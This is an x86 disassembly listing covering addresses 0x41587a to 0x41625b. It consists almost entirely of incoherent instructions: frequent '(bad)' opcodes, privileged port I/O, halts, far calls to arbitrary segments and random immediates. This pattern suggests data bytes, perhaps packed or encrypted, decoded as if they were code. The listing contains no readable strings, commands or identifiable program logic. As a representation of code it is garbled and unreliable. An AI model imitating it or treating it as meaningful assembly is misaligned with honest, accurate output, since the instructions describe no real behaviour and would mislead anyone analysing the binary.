  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rol    DWORD PTR [edx+0x20b0571e],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR [ecx+eax*1],al
  41588a:	add    BYTE PTR [eax],al
  41588c:	out    0x9f,al
  41588e:	xlat   BYTE PTR ds:[ebx]
  41588f:	mov    eax,0x63cab94e
  415894:	xchg   ecx,eax
  415895:	ret    0x9d3d
  415898:	push   eax
  415899:	push   edi
  41589a:	shr    dh,0xae
  41589d:	cmp    DWORD PTR ds:0x45c8a167,esp
  4158a3:	sub    edi,DWORD PTR [ecx+0x6c467491]
  4158a9:	push   edi
  4158aa:	mov    al,ds:0x4550a01c
  4158af:	jns    0x415854
  4158b1:	fs push cs
  4158b3:	enter  0x4ea1,0x93
  4158b7:	pusha  
  4158b8:	mov    bh,0x9b
  4158ba:	stos   BYTE PTR es:[edi],al
  4158bb:	sub    BYTE PTR [ecx+edx*4-0x2e5aa560],bh
  4158c2:	(bad)
  4158c7:	xchg   esi,edi
  4158c9:	add    bh,al
  4158cb:	outs   dx,DWORD PTR ds:[esi]
  4158cc:	ret    
  4158cd:	mov    dl,0x3f
  4158cf:	xchg   esp,eax
  4158d0:	stc    
  4158d1:	daa    
  4158d2:	mov    ch,0xc2
  4158d4:	mov    dh,BYTE PTR [ebx+0x4838db33]
  4158da:	pusha  
  4158db:	mov    ds:0x330f54b3,eax
  4158e0:	jbe    0x41594d
  4158e2:	pop    eax
  4158e3:	pop    es
  4158e4:	aam    0x9f
  4158e6:	fld    DWORD PTR cs:[eax+ecx*2+0x55c4ed77]
  4158ee:	adc    eax,0xdf9ecd18
  4158f3:	outs   dx,DWORD PTR ds:[esi]
  4158f4:	xchg   ecx,eax
  4158f5:	mov    al,ds:0xc39514d6
  4158fa:	fyl2xp1 
  4158fc:	push   ds
  4158fd:	imul   ebx,esi,0xffffffe7
  415900:	in     eax,0x7
  415902:	es jae 0x4158c7
  415905:	xchg   esp,eax
  415906:	loopne 0x41593a
  415908:	or     BYTE PTR [ebp-0x527adc89],al
  41590e:	push   ecx
  41590f:	or     BYTE PTR [edx+0x164860dd],ch
  415915:	mov    ch,BYTE PTR [eax+0x32]
  415918:	outs   dx,DWORD PTR ds:[esi]
  415919:	mov    bl,0x52
  41591b:	out    0xdd,eax
  41591d:	outs   dx,BYTE PTR ds:[esi]
  41591e:	and    bl,bl
  415920:	int    0xc8
  415922:	sub    ah,dh
  415924:	leave  
  415925:	jge    0x4159a5
  415927:	jp     0x4158f1
  415929:	xor    BYTE PTR [edi-0x1b2e177],cl
  41592f:	rol    BYTE PTR [ecx+0x6c5aaac9],0x49
  415936:	mov    edx,0x63fdc952
  41593b:	(bad)  
  41593c:	jno    0x41596d
  41593e:	loope  0x415920
  415940:	xchg   edx,eax
  415941:	mov    cl,0xec
  415943:	sti    
  415944:	mov    eax,0xb82a8093
  415949:	inc    esi
  41594a:	xchg   DWORD PTR [edx-0x42],esp
  41594d:	adc    eax,0xd605b907
  415952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415953:	inc    ebx
  415954:	and    eax,DWORD PTR [esi+0x44]
  415957:	pop    ss
  415958:	adc    eax,0x6a626267
  41595d:	fwait
  41595e:	lock mov edi,0x44c347f7
  415964:	ins    BYTE PTR es:[edi],dx
  415965:	out    dx,eax
  415966:	cmp    BYTE PTR [edi+0x38a91c51],0xc6
  41596d:	inc    edx
  41596e:	xor    BYTE PTR ds:0x39d0ab27,dl
  415974:	jp     0x4159f5
  415976:	or     esp,edi
  415978:	push   0x39
  41597a:	or     ebp,DWORD PTR [eax]
  41597c:	out    0x71,eax
  41597e:	xchg   ebx,eax
  41597f:	ret    0xab63
  415982:	jge    0x415987
  415984:	enter  0x543b,0x92
  415988:	jns    0x41599a
  41598a:	jle    0x415948
  41598c:	idiv   BYTE PTR [ecx+0x10ba]
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	sub    eax,DWORD PTR [eax]
  415a02:	inc    edx
  415a03:	pusha  
  415a04:	and    al,0xe4
  415a06:	add    BYTE PTR [eax],al
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	jmp    0xb5fa:0xa8737826
  415a13:	sub    edx,ebx
  415a15:	in     eax,0x24
  415a17:	lock or BYTE PTR [ebx-0x3fcdd2a],bh
  415a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a1f:	jns    0x415a6d
  415a21:	xor    eax,0xe8ef5ec6
  415a26:	and    eax,0xe86bbd45
  415a2b:	hlt    
  415a2c:	dec    ebx
  415a2d:	or     al,0xe
  415a2f:	sahf   
  415a30:	mov    dl,0xc3
  415a32:	and    BYTE PTR [esi-0x14cb9d62],0xf0
  415a39:	out    0x47,eax
  415a3b:	scas   eax,DWORD PTR es:[edi]
  415a3c:	(bad)  
  415a3d:	ss xor bl,ah
  415a40:	jb     0x415aaa
  415a42:	adc    BYTE PTR [ebp+0x1d],bl
  415a45:	sub    BYTE PTR cs:[edi+0x527b1007],0x1a
  415a4d:	mov    ebx,0x1d42162c
  415a52:	popa   
  415a53:	(bad)  
  415a54:	hlt    
  415a55:	clc    
  415a56:	inc    edx
  415a58:	sub    al,BYTE PTR [esi]
  415a5a:	dec    esi
  415a5b:	jmp    0x766de0ea
  415a60:	addr16 in eax,0x47
  415a63:	mov    WORD PTR [ecx],?
  415a65:	icebp  
  415a66:	dec    edx
  415a67:	jns    0x415ab0
  415a69:	xor    al,0x48
  415a6b:	push   ecx
  415a6c:	leave  
  415a6d:	and    BYTE PTR [ecx],bl
  415a6f:	mov    ecx,0x450de968
  415a74:	mov    dh,0xd5
  415a76:	jl     0x415a17
  415a78:	cwde   
  415a79:	jb     0x415a10
  415a7b:	jno    0x415af5
  415a7d:	fist   DWORD PTR [edx+esi*4+0x5f]
  415a81:	cmp    ebx,DWORD PTR [edx+0x1175d4d2]
  415a87:	xlat   BYTE PTR ds:[ebx]
  415a88:	xchg   edx,eax
  415a89:	ins    WORD PTR es:[edi],dx
  415a8b:	(bad)  
  415a8c:	xchg   ebp,eax
  415a8d:	cld    
  415a8e:	jno    0x415aae
  415a90:	daa    
  415a91:	fcomp  DWORD PTR [esi]
  415a93:	aad    0xb
  415a95:	cmc    
  415a96:	add    eax,0x68ceb5f9
  415a9b:	inc    eax
  415a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a9d:	aaa    
  415a9e:	popa   
  415a9f:	into   
  415aa0:	jo     0x415b1a
  415aa2:	dec    eax
  415aa3:	ds sbb eax,0x1a94f5c5
  415aa9:	in     eax,dx
  415aaa:	cld    
  415aab:	in     eax,dx
  415aac:	push   ecx
  415aad:	pop    edi
  415aae:	dec    eax
  415aaf:	or     ebx,0xffffff84
  415ab2:	loop   0x415a92
  415ab4:	dec    esi
  415ab5:	or     al,0xd2
  415ab7:	pop    edx
  415ab8:	sahf   
  415ab9:	mov    esp,0x40de70c8
  415abe:	xlat   BYTE PTR ds:[ebx]
  415abf:	test   BYTE PTR [edi-0x114fbf6a],al
  415ac5:	rcr    DWORD PTR [ecx+ebx*4-0x733302e7],0x1e
  415acd:	test   al,0x7d
  415acf:	ss pop esi
  415ad1:	loope  0x415ac5
  415ad3:	scas   al,BYTE PTR es:[edi]
  415ad4:	call   0x5da0:0x33215769
  415adb:	add    eax,0x83b7c5e5
  415ae0:	es xor eax,edx
  415ae3:	xor    eax,DWORD PTR [ebp+ebx*2+0xb15603e]
  415aea:	pushf  
  415aeb:	out    dx,eax
  415aec:	leave  
  415aed:	adc    BYTE PTR [esp+edx*8],cl
  415af0:	inc    ebx
  415af1:	mov    bh,bh
  415af3:	aam    0xf0
  415af5:	xchg   esi,eax
  415af6:	(bad)  
  415af8:	nop
  415af9:	sub    DWORD PTR [ebp+0x74],ebp
  415afc:	std    
  415afd:	in     eax,dx
  415afe:	ins    BYTE PTR es:[edi],dx
  415aff:	call   0xf2ec:0x2ee5c5cc
  415b06:	push   esi
  415b07:	iret   
  415b08:	stos   DWORD PTR es:[edi],eax
  415b09:	mov    eax,ds:0xd9881e4c
  415b0e:	push   0xfffffff3
	...
  415b74:	fistp  QWORD PTR [esi-0x449a6dfb]
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fsub   QWORD PTR [ebx+0x280520a3]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	xchg   ecx,eax
  415b8d:	mov    esi,0x8c70d87a
  415b92:	jg     0x415b28
  415b94:	cdq    
  415b95:	push   0x2f
  415b97:	jb     0x415bc5
  415b99:	(bad)  
  415b9b:	mov    ?,ecx
  415b9d:	adc    ah,ch
  415b9f:	xchg   DWORD PTR [ebp+0x20],edx
  415ba2:	pop    edx
  415ba3:	test   DWORD PTR [ecx],edx
  415ba5:	jle    0x415b31
  415ba7:	inc    ecx
  415ba8:	dec    edx
  415ba9:	gs into 
  415bab:	popa   
  415bac:	popa   
  415bad:	(bad)  
  415bae:	add    DWORD PTR [esi+ebx*2+0x5de2602c],eax
  415bb5:	inc    eax
  415bb6:	push   ss
  415bb7:	cmp    ebx,DWORD PTR [ebp+0xa]
  415bba:	jbe    0x415bca
  415bbc:	xchg   edi,eax
  415bbd:	mov    esp,0xd8169ebd
  415bc2:	call   0x908c:0x55b0cb3c
  415bc9:	fnstcw WORD PTR [ecx]
  415bcb:	xor    esi,ebp
  415bcd:	push   ebx
  415bce:	and    al,0x2c
  415bd0:	xchg   edi,eax
  415bd1:	sti    
  415bd2:	hlt    
  415bd3:	(bad)  
  415bd4:	ret    
  415bd5:	inc    edx
  415bd6:	mov    eax,ds:0x5e8051be
  415bdb:	jl     0x415c38
  415bdd:	nop
  415bde:	sti    
  415bdf:	ret    
  415be0:	mov    ebp,0xb349b826
  415be5:	dec    eax
  415be6:	call   0xeb075aad
  415beb:	test   al,0x1
  415bed:	pop    ebx
  415bee:	sahf   
  415bef:	leave  
  415bf0:	mov    ebx,0xf9b038f4
  415bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf6:	adc    al,BYTE PTR [esi-0x1c]
  415bf9:	dec    esi
  415bfa:	sahf   
  415bfb:	lds    ebp,FWORD PTR [esi]
  415bfd:	loopne 0x415bbe
  415bff:	push   ds
  415c00:	ins    BYTE PTR es:[edi],dx
  415c01:	fadd   DWORD PTR [esp+edx*2+0x49d455e8]
  415c08:	aas    
  415c09:	sahf   
  415c0a:	sbb    al,0x23
  415c0c:	add    dl,bh
  415c0e:	inc    esp
  415c0f:	pop    ss
  415c10:	pop    eax
  415c11:	mov    eax,0xfe0d363d
  415c16:	push   esp
  415c17:	arpl   WORD PTR [esi+eiz*2+0x68abf56f],ax
  415c1e:	adc    eax,edx
  415c20:	inc    ecx
  415c21:	jb     0x415c9b
  415c23:	pop    ecx
  415c24:	call   0x78c5:0x5ade301d
  415c2b:	je     0x415c9f
  415c2d:	cmp    BYTE PTR [eax-0x282a2a98],cl
  415c33:	icebp  
  415c34:	int3   
  415c35:	mov    ebp,0x64c4e9d7
  415c3a:	xor    ch,BYTE PTR [ebp+0x46206e1a]
  415c40:	push   ebp
  415c41:	inc    ebx
  415c42:	and    al,0x57
  415c44:	sbb    edi,ebx
  415c46:	sbb    dh,BYTE PTR [ebx]
  415c48:	cmp    eax,0xbf35c33
  415c4d:	fidivr DWORD PTR [ebx]
  415c4f:	pusha  
  415c50:	cmp    al,0xb3
  415c52:	mov    DWORD PTR [ebx+0x3a],edx
  415c55:	(bad)  
  415c56:	push   cs
  415c57:	sti    
  415c58:	cmp    cl,BYTE PTR [esi+0xa9b45f9]
  415c5e:	(bad)  
  415c60:	stos   DWORD PTR es:[edi],eax
  415c61:	cmp    ah,BYTE PTR [esi]
  415c63:	jae    0x415c49
  415c65:	xor    esp,esi
  415c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c68:	mov    bh,0x5e
  415c6a:	fcomi  st,st(7)
  415c6c:	lods   al,BYTE PTR ds:[esi]
  415c6d:	(bad)  
  415c6e:	mov    al,0x74
  415c70:	xchg   edx,eax
  415c71:	jnp    0x415cec
  415c73:	mov    ebx,0x8eca0d5b
  415c78:	test   eax,0x73583d9c
  415c7d:	pop    esp
  415c7e:	popf   
  415c7f:	push   ecx
  415c80:	mov    eax,ds:0x18242e93
  415c85:	and    eax,0xfcb1fcc5
  415c8a:	enter  0x5338,0x9f
  415c8e:	push   esp
  415c8f:	aad    0x0
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xb5d99b1f
  415d03:	sub    al,0x2c
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR [ecx+eax*1],al
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	sbb    ch,BYTE PTR [edi-0x2f]
  415d0f:	and    eax,0x29d3a1b7
  415d14:	fwait
  415d15:	mov    es,WORD PTR [edi+ecx*1]
  415d18:	fsubr  DWORD PTR [eax-0x3fd4c6c9]
  415d1e:	psubusw mm3,mm7
  415d21:	pop    ss
  415d22:	fiadd  WORD PTR [ebx+0x6d]
  415d25:	(bad)  
  415d26:	or     DWORD PTR [ecx-0x15],esp
  415d29:	mov    BYTE PTR [edx-0x64],bh
  415d2c:	push   ecx
  415d2d:	adc    BYTE PTR [ebx-0x1024ae28],al
  415d33:	jecxz  0x415d3b
  415d35:	ret    0xb506
  415d38:	cwde   
  415d39:	out    0x71,al
  415d3b:	push   es
  415d3c:	mov    al,0xee
  415d3e:	xchg   ecx,eax
  415d3f:	mov    ah,0x45
  415d41:	jg     0x415d19
  415d43:	lods   eax,DWORD PTR ds:[esi]
  415d44:	xor    ebp,DWORD PTR [esi+0x4b104782]
  415d4a:	sbb    eax,0x9f7b54cf
  415d4f:	mov    ecx,0x6edd1b4e
  415d54:	dec    ebx
  415d55:	test   DWORD PTR [edx-0x43],ebx
  415d58:	dec    ecx
  415d59:	adc    BYTE PTR [esi-0x54],al
  415d5c:	xchg   ecx,eax
  415d5d:	pushf  
  415d5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d5f:	pop    ebp
  415d60:	mov    ebp,0x33a24760
  415d65:	inc    ecx
  415d66:	jg     0x415cfa
  415d68:	dec    eax
  415d6a:	stc    
  415d6b:	mov    BYTE PTR [edi],0xf9
  415d6e:	(bad)  
  415d6f:	cmp    BYTE PTR [ebx-0x3fd7d2aa],ah
  415d75:	(bad)  
  415d76:	mov    bh,0xc9
  415d78:	xchg   ecx,eax
  415d79:	int3   
  415d7a:	dec    edx
  415d7b:	pushf  
  415d7c:	mov    ebp,0x9598a2ce
  415d81:	pop    esi
  415d82:	mov    dl,0xa4
  415d84:	sub    ebp,DWORD PTR [ecx+0x59bdbb4d]
  415d8a:	mov    ecx,esp
  415d8c:	xchg   edi,eax
  415d8d:	dec    DWORD PTR [ebp-0x36]
  415d90:	jns    0x415d45
  415d92:	sahf   
  415d93:	lea    eax,[ebp+0x59]
  415d96:	push   ds
  415d97:	in     eax,dx
  415d98:	sti    
  415d99:	fistp  QWORD PTR [ebp+0x45db4516]
  415d9f:	aam    0xe
  415da1:	adc    edi,ecx
  415da3:	pop    esi
  415da4:	push   edi
  415da5:	jae    0x415db8
  415da7:	inc    eax
  415da8:	ret    
  415da9:	xor    cl,BYTE PTR ds:0xde9fc33d
  415daf:	ss mov edi,0x3693eb7b
  415db5:	dec    ebp
  415db6:	xor    dh,BYTE PTR [edx+eiz*8-0x35]
  415dba:	jne    0x415d76
  415dbc:	push   eax
  415dbd:	sti    
  415dbe:	pop    ebx
  415dbf:	xor    BYTE PTR [esi+0x58],dl
  415dc2:	je     0x415e1e
  415dc4:	push   ecx
  415dc5:	fisttp QWORD PTR [eax-0x32a078bf]
  415dcb:	dec    ebp
  415dcc:	add    dl,al
  415dce:	repnz imul BYTE PTR [ebp-0x4d]
  415dd2:	(bad)  
  415dd3:	or     dh,dh
  415dd5:	jl     0x415e02
  415dd7:	sub    ah,ah
  415dd9:	cs loopne 0x415e1b
  415ddc:	pop    esi
  415ddd:	xor    DWORD PTR [ecx],0x456afd3f
  415de3:	dec    esi
  415de4:	xor    cl,BYTE PTR [edi+0x3b]
  415de7:	retf   0xfdd3
  415dea:	or     BYTE PTR [ebx+0x1f135d1b],cl
  415df0:	or     bh,bh
  415df2:	add    BYTE PTR [ebp-0x487f34fd],0x3e
  415df9:	sbb    BYTE PTR [esi-0x19],ah
  415dfc:	mov    esi,0xc1be6883
  415e01:	shl    ah,cl
  415e03:	lds    eax,FWORD PTR [edx-0x14975316]
  415e09:	fnstcw WORD PTR [edx+ecx*2+0x5ba1d7f3]
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x7]
  415e81:	and    ah,dl
  415e83:	loope  0x415eb5
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR [ecx+eax*1],al
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	adc    BYTE PTR [eax-0x4026298d],cl
  415e92:	cmp    ah,BYTE PTR [ebp+0x2eb21a67]
  415e98:	addr16 add bh,cl
  415e9b:	push   eax
  415e9c:	(bad)  
  415e9d:	jae    0x415ea3
  415e9f:	mov    ch,0x3d
  415ea1:	sbb    al,0x2e
  415ea3:	dec    edi
  415ea4:	jno    0x415e90
  415ea6:	aaa    
  415ea7:	lahf   
  415ea8:	mov    ebp,0xef4b96d3
  415ead:	stc    
  415eae:	push   ebx
  415eaf:	jecxz  0x415e71
  415eb1:	in     eax,0xa2
  415eb3:	adc    esi,DWORD PTR [ecx+0xc]
  415eb6:	pop    ss
  415eb7:	jae    0x415ebb
  415eb9:	adc    DWORD PTR [ecx],edx
  415ebb:	test   eax,0x4c85779a
  415ec0:	lds    edi,FWORD PTR [esi-0x4d4d3709]
  415ec6:	fcmovnb st,st(7)
  415ec8:	and    bh,BYTE PTR [edx]
  415eca:	xor    ebx,DWORD PTR [edi]
  415ecc:	push   ecx
  415ecd:	sti    
  415ece:	or     al,0xa8
  415ed0:	(bad)  
  415ed1:	cmp    eax,0xf352905c
  415ed6:	cmp    BYTE PTR [ebp+0x4b74716c],0x44
  415edd:	pop    esp
  415ede:	rcr    DWORD PTR [esi-0x3],cl
  415ee1:	and    BYTE PTR [ebx+0x1a],ah
  415ee4:	(bad)  
  415ee5:	les    ebp,FWORD PTR [edx-0x3f]
  415ee8:	and    BYTE PTR [edi+ebp*8-0x59],ch
  415eec:	and    al,0xab
  415eee:	pop    ds
  415eef:	or     al,0xa1
  415ef1:	xor    al,0x26
  415ef3:	add    edx,DWORD PTR [eax+0x1a]
  415ef6:	outs   dx,DWORD PTR ds:[esi]
  415ef7:	les    ebp,FWORD PTR [eax+0x7c]
  415efa:	add    al,0xc8
  415efc:	mov    ecx,0xede774f1
  415f01:	fld    DWORD PTR [ecx-0x467faf40]
  415f07:	sbb    al,0xc1
  415f09:	and    DWORD PTR [edi+0x6d],esp
  415f0c:	ja     0x415f69
  415f0e:	cmc    
  415f0f:	mov    WORD PTR [ebp+0x6176f815],ds
  415f15:	cmp    al,BYTE PTR [ecx+0x2971a4ac]
  415f1b:	xchg   ebp,eax
  415f1c:	cmp    eax,0xac1de7ef
  415f21:	stc    
  415f22:	sbb    BYTE PTR [edx-0x47],dl
  415f25:	pop    es
  415f26:	les    edi,FWORD PTR [ebx+0x54]
  415f29:	lods   eax,DWORD PTR ds:[esi]
  415f2a:	dec    esp
  415f2b:	adc    ah,bh
  415f2d:	mov    bh,BYTE PTR ds:0x4a63df61
  415f33:	jbe    0x415f2f
  415f35:	clc    
  415f36:	pop    ss
  415f37:	mov    cl,0x56
  415f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f3a:	fstp   QWORD PTR [esi+0x5e282954]
  415f40:	clc    
  415f41:	retf   
  415f42:	into   
  415f43:	jae    0x415f96
  415f45:	rcr    DWORD PTR [edx-0x50444c4e],cl
  415f4b:	fistp  WORD PTR [edi+0x32a4ae8e]
  415f51:	out    0xab,eax
  415f53:	scas   eax,DWORD PTR es:[edi]
  415f54:	iret   
  415f55:	jmp    0xb5bd:0x6514d8fb
  415f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f5d:	js     0x415f3e
  415f5f:	jno    0x415fb8
  415f61:	xchg   edx,eax
  415f62:	fwait
  415f63:	push   edi
  415f64:	popa   
  415f65:	call   0xc5b9:0x3aa8cf09
  415f6c:	clc    
  415f6d:	cmp    cl,0xec
  415f70:	fsubr  QWORD PTR [edx-0x51]
  415f73:	sub    BYTE PTR [edi-0x2f],dh
  415f76:	push   esp
  415f77:	xchg   BYTE PTR [edx-0x76],dh
  415f7a:	stos   BYTE PTR es:[edi],al
  415f7b:	cs (bad) 
  415f7d:	outs   dx,DWORD PTR ds:[esi]
  415f7e:	sub    BYTE PTR [ebp+eax*2+0x331d8f1e],bl
  415f85:	jae    0x415fe6
  415f87:	call   0xad86:0x9316047
  415f8e:	pusha  
  415f8f:	xchg   BYTE PTR [eax],al
	...
  415ff1:	add    BYTE PTR [eax],al
  415ff3:	add    BYTE PTR [edi],dl
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	and    BYTE PTR [eax-0x2e],bl
  416003:	mov    DWORD PTR [eax+ebp*8],esi
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	or     BYTE PTR [eax+0x7f],dl
  41600f:	cmp    edi,esi
  416011:	fcmove st,st(5)
  416013:	or     dh,BYTE PTR [edx]
  416015:	mov    edi,0x9791145d
  41601a:	sbb    al,0xb2
  41601c:	sbb    ecx,DWORD PTR ds:0x19d240dd
  416022:	mov    BYTE PTR [ecx],bl
  416024:	test   DWORD PTR [ebp-0x1bb6f268],eax
  41602a:	js     0x415fb9
  41602c:	push   edx
  41602d:	popa   
  41602e:	inc    edi
  41602f:	add    BYTE PTR [ebp-0x35],ch
  416032:	repnz add esp,edi
  416035:	cdq    
  416036:	sub    DWORD PTR [esi-0x23],0x1b7e1a89
  41603d:	push   ebx
  41603e:	dec    eax
  41603f:	lock or DWORD PTR [edi],ecx
  416042:	(bad)  
  416044:	imul   esi,ebp,0xff58459f
  41604a:	and    esp,DWORD PTR [ebx-0x4e]
  41604d:	xchg   edi,eax
  41604e:	sub    ebx,DWORD PTR [edi]
  416050:	cmp    DWORD PTR [esi+0x5],ebp
  416053:	stos   BYTE PTR es:[edi],al
  416054:	mov    eax,0x5377777e
  416059:	mov    ebp,0xca117b1
  41605e:	cwde   
  41605f:	loop   0x416005
  416061:	push   cs
  416062:	cmp    DWORD PTR [ebx+0x75f4eeb5],edi
  416068:	pop    eax
  416069:	mov    dl,BYTE PTR [edx+ebx*1-0x3]
  41606d:	and    eax,0xb44dd40f
  416072:	mov    ds,WORD PTR [ebx+0x6c]
  416075:	pop    ss
  416076:	and    DWORD PTR [eax],ecx
  416078:	cmp    edx,edx
  41607a:	icebp  
  41607b:	sbb    BYTE PTR [esi+0x487695],bl
  416081:	and    al,0xc
  416083:	or     eax,0x95fc4263
  416088:	pop    edx
  416089:	retf   0x5c48
  41608c:	jno    0x416041
  41608e:	in     al,dx
  41608f:	sub    DWORD PTR [ecx*8+0x76246cc0],0x27185a34
  41609a:	cdq    
  41609b:	jnp    0x416062
  41609d:	mov    esp,0x1b304a80
  4160a2:	push   ss
  4160a3:	xor    bl,BYTE PTR [ecx+ebp*4]
  4160a6:	lds    ecx,FWORD PTR [ecx+eiz*8]
  4160a9:	xor    al,0xb4
  4160ab:	push   ebx
  4160ac:	sbb    DWORD PTR [ebx-0x3428638],esp
  4160b2:	inc    ebp
  4160b3:	and    ecx,DWORD PTR [eax-0x36]
  4160b6:	pop    esp
  4160b7:	outs   dx,DWORD PTR ds:[esi]
  4160b8:	jmp    0x9221b556
  4160bd:	add    BYTE PTR [esi-0x1ebba796],ah
  4160c3:	ficomp WORD PTR [esi+0x61]
  4160c6:	inc    edi
  4160c7:	inc    ebp
  4160c8:	nop
  4160c9:	dec    ecx
  4160ca:	xchg   ebp,eax
  4160cb:	fild   QWORD PTR [eax+0x497af81b]
  4160d1:	inc    ebp
  4160d2:	aaa    
  4160d3:	ror    esi,0x89
  4160d6:	out    dx,al
  4160d7:	cdq    
  4160d8:	mov    eax,0xddf2c82d
  4160dd:	cmp    bl,BYTE PTR [edx]
  4160df:	and    edi,DWORD PTR [ebx+0x30]
  4160e2:	sub    DWORD PTR [ecx+0x45],ebp
  4160e5:	inc    eax
  4160e6:	push   0x607658c5
  4160eb:	sbb    al,0xd0
  4160ed:	outs   dx,DWORD PTR ds:[esi]
  4160ee:	(bad)  
  4160ef:	xchg   edi,eax
  4160f0:	push   ebp
  4160f1:	adc    cl,al
  4160f3:	aam    0xeb
  4160f5:	aam    0xfb
  4160f7:	pop    ebx
  4160f8:	gs dec esi
  4160fa:	ficomp DWORD PTR [esi+0x2d159936]
  416100:	ja     0x41613d
  416102:	in     al,0x25
  416104:	(bad)  
  416105:	arpl   WORD PTR [ebp-0x49],dx
  416108:	mov    eax,0x122cb849
  41610d:	shl    BYTE PTR [eax],1
  41610f:	add    BYTE PTR gs:[eax],al
	...
  416172:	add    BYTE PTR [eax],al
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x6e9de0f3
  416183:	xchg   ebp,eax
  416184:	cmp    cl,ch
  416186:	add    BYTE PTR [eax],al
  416188:	add    al,0x1
  41618a:	add    BYTE PTR [eax],al
  41618c:	fcmove st,st(5)
  41618e:	mov    al,ds:0x9c84b05c
  416193:	lods   eax,DWORD PTR ds:[esi]
  416194:	cmp    ch,bl
  416196:	or     DWORD PTR [ecx-0x4c162b62],eax
  41619c:	inc    ebp
  41619d:	adc    DWORD PTR [eax+0x18],0xffffffc6
  4161a1:	pop    ecx
  4161a2:	ret    0x6547
  4161a5:	in     eax,0xd5
  4161a7:	in     eax,dx
  4161a8:	jnp    0x4161f8
  4161aa:	lds    eax,FWORD PTR [edx+0x3cfce3f7]
  4161b0:	mov    ebp,cs
  4161b2:	inc    edi
  4161b3:	repz dec edi
  4161b5:	or     edx,DWORD PTR [esp+edi*2+0x7]
  4161b9:	je     0x416221
  4161bb:	scas   eax,DWORD PTR es:[edi]
  4161bc:	mov    esi,0xfe9e3b90
  4161c1:	jne    0x4161f9
  4161c3:	int    0x5c
  4161c5:	lods   al,BYTE PTR ds:[esi]
  4161c6:	push   0x12
  4161c8:	jge    0x416228
  4161ca:	xor    BYTE PTR [esi-0x51697581],al
  4161d0:	pop    ecx
  4161d1:	or     edi,DWORD PTR [edx]
  4161d3:	in     eax,dx
  4161d4:	add    al,0xee
  4161d6:	test   bh,bh
  4161d8:	dec    edi
  4161d9:	sub    edi,esp
  4161db:	imul   ebp,DWORD PTR [edi+0x28],0xe6f67f3b
  4161e2:	jne    0x41625f
  4161e4:	inc    ebx
  4161e5:	push   ebx
  4161e6:	adc    bh,BYTE PTR [eax+0x45]
  4161e9:	xchg   DWORD PTR [edi+0x3328382a],edi
  4161ef:	mov    eax,ds:0xcc752a43
  4161f4:	or     dh,0x83
  4161f7:	aas    
  4161f8:	into   
  4161f9:	mov    DWORD PTR [ecx-0x570c09f6],eax
  4161ff:	cmc    
  416200:	retf   0xc7f6
  416203:	or     bl,cl
  416205:	shl    BYTE PTR [ebx],0x84
  416208:	lock and bl,ch
  41620b:	jecxz  0x416249
  41620d:	es fs hlt 
  416210:	fsub   st,st(3)
  416212:	mov    eax,ds:0x92cd3f96
  416217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416218:	inc    esp
  416219:	outs   dx,DWORD PTR ds:[esi]
  41621a:	dec    edi
  41621b:	push   eax
  41621c:	mov    ah,0xa1
  41621e:	rcr    BYTE PTR [eax-0x1a],0xb
  416222:	push   ebx
  416223:	in     eax,dx
  416224:	add    BYTE PTR [ebx],bl
  416226:	frstor [ecx-0x1044971b]
  41622c:	inc    edx
  41622d:	cmp    eax,0xc2504d2b
  416232:	or     DWORD PTR [esi+0x43ddeb53],0xffffff92
  416239:	mov    dh,0x2c
  41623b:	dec    edx
  41623c:	je     0x4161ed
  41623e:	lods   al,BYTE PTR ds:[esi]
  41623f:	jp     0x4161e8
  416241:	lods   eax,DWORD PTR ds:[esi]
  416242:	jo     0x416248
  416244:	pop    esp
  416245:	dec    esi
  416246:	jbe    0x416205
  416248:	adc    cl,BYTE PTR [edx+0x50]
  41624b:	in     eax,0x8a
  41624d:	mov    esp,0xd2d1ec7e
  416252:	mov    dl,0x92
  416254:	ins    DWORD PTR es:[edi],dx
  416255:	leave  
  416256:	add    DWORD PTR [eax],edx
  416258:	jns    0x416269
  41625a:	ins    BYTE PTR es:[edi],dx
  41625b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
